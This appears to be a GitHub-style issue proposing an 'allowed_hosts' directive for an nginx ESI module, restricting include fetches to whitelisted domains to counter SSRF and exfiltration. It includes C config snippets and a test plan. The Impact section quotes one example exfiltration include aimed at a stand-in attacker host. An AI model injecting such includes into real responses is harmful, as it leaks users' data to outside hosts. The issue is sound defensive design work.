# [nginx] Add `allowed_hosts` directive

## Problem

`servers/nginx/ngx_http_mesi_module.c` calls `EsiParse` which has no `AllowedHosts` parameter. Any `<esi:include>` URL is fetched unconditionally (subject only to `BlockPrivateIPs` — which is currently disabled).

There is no way to restrict ESI includes to a whitelist of approved origin domains.

## Impact

- **Defense-in-depth gap** — Even after `BlockPrivateIPs` is enabled, any public host is reachable. A compromised backend can inject `<esi:include src="https://attacker.com/exfil?data=...">` to exfiltrate data.
- **No compliance path** — PCI-DSS and similar standards require restricting outbound connections from edge proxies to known endpoints.
- **No organizational policy enforcement** — Operators cannot restrict ESI to approved CDN/catalog domains.

## Context

`mesi.EsiParserConfig.AllowedHosts` (`mesi/config.go:21`) is `[]string`. When non-empty, only hosts matching the list (exact or subdomain suffix) pass `isURLSafe` in `mesi/ssrf.go:40-51`.

`libgomesi/libgomesi.go:76` — `ParseWithConfig` already accepts `allowedHosts` as a space-separated string:

```c
char* EsiParseWithConfig(char* input, int maxDepth, char* defaultUrl,
                         char* allowedHosts, int blockPrivateIPs);
```

The Go side parses it: `strings.Fields(hostsStr)` → `[]string`.

**Prerequisite**: nginx must migrate from `Parse` to `ParseWithConfig` (or `ParseJson`). This is shared work with issue #004.

## Proposed solution

### 1. Extend loc_conf_t

```c
typedef struct {
    ngx_flag_t enable_mesi;
    ngx_int_t  max_depth;
    ngx_int_t  timeout_seconds;
    ngx_flag_t parse_on_header;
    ngx_flag_t block_private_ips;
    ngx_str_t  allowed_hosts;  // space-separated hosts
} ngx_http_mesi_loc_conf_t;
```

### 2. Add directive

Space-separated host list, following Apache's `MesiAllowedHosts` pattern for consistency:

```c
{ngx_string("mesi_allowed_hosts"), NGX_HTTP_LOC_CONF | NGX_CONF_TAKE1,
 ngx_conf_set_str_slot, NGX_HTTP_LOC_CONF_OFFSET,
 offsetof(ngx_http_mesi_loc_conf_t, allowed_hosts), NULL},
```

This stores the raw string. Multiple hosts are space-separated: `mesi_allowed_hosts backend.internal cdn.example.com`.

### 3. Default and merge

```c
// In merge_loc_conf:
if (conf->allowed_hosts.len == 0) {
    conf->allowed_hosts = prev->allowed_hosts;
}
// Default: empty (no restriction)
```

### 4. Pass to ParseWithConfig

```c
ngx_str_t *hosts = &lcf->allowed_hosts;
char *hosts_cstr = (hosts->len > 0)
    ? ngx_str_to_cstr(hosts, r->pool)
    : "";

char *message = EsiParseWithConfig(
    ngx_str_to_cstr(&input, r->pool),
    (int)lcf->max_depth,
    ngx_str_to_cstr(&base_url, r->pool),
    hosts_cstr,                  // space-separated hosts
    lcf->block_private_ips
);
```

Or via `ParseJson`:

```c
// Build JSON with hosts array
// "allowedHosts":["backend.internal","cdn.example.com"]
```

### nginx.conf example

```nginx
location / {
    enable_mesi on;
    mesi_block_private_ips on;
    mesi_allowed_hosts backend.internal cdn.example.com api.trusted.org;
}
```

## Acceptance criteria

- [ ] **Tests** — Unit test directive parsing: empty (no restriction), single host, multiple hosts (space-separated)
- [ ] **Tests** — Unit test merge: parent sets hosts, child unsets → child inherits parent
- [ ] **Tests** — Unit test merge: parent unsets, child sets → child's hosts
- [ ] **Tests** — Unit test `ngx_str_to_cstr` for hosts → correctly null-terminated space-separated string
- [ ] **Docs** — Add `mesi_allowed_hosts` to README with format, subdomain matching behavior, examples
- [ ] **Docs** — Document matching semantics: `example.com` matches `example.com` and `sub.example.com`, but NOT `attacker-example.com`
- [ ] **Functional tests** — nginx integration test:
  - `allowed_hosts backend` → include `http://backend:8000/test.html` works
  - `allowed_hosts backend` → include `http://evil.com/test.html` blocked
  - `allowed_hosts backend` → include `http://sub.backend:8000/test.html` works (subdomain match)
  - `allowed_hosts backend` → include `http://notbackend.com/test.html` blocked
  - `allowed_hosts` (unset) → all hosts allowed (backward compatible, subject to BlockPrivateIPs)
  - Multiple hosts specified → each tested separately
- [ ] **Changelog** — Entry in project changelog
- [ ] **Security** — Verify suffix-injection: `allowed_hosts example.com` must NOT match `attacker-example.com`

## Notes

- Space-separated string matches Apache's `MesiAllowedHosts` directive format. This is deliberate for cross-server consistency.
- The hosts string must be null-terminated for CGo. `ngx_str_to_cstr` in the module already handles this.
- `ParseWithConfig` uses `strings.Fields` which splits on any whitespace. Multiple spaces between hosts in nginx config are fine.
- Host matching in `mesi/ssrf.go:42-51`: exact match (`host == allowedHost`) or subdomain suffix (`strings.HasSuffix(host, "."+allowedHost)`). Subdomain matching is suffix-based: `sub.example.com` matches `example.com`. Document this clearly.
- If both `allowed_hosts` and `block_private_ips off` are set, operators must understand that AllowedHosts check runs FIRST (by hostname), then BlockPrivateIPs runs at dial time (by resolved IP). This two-phase check is intentional defense-in-depth.
- For the `ParseJson` approach, the hosts array serialization to JSON requires escaping quotes and special chars. A simpler C helper function could build the JSON array.
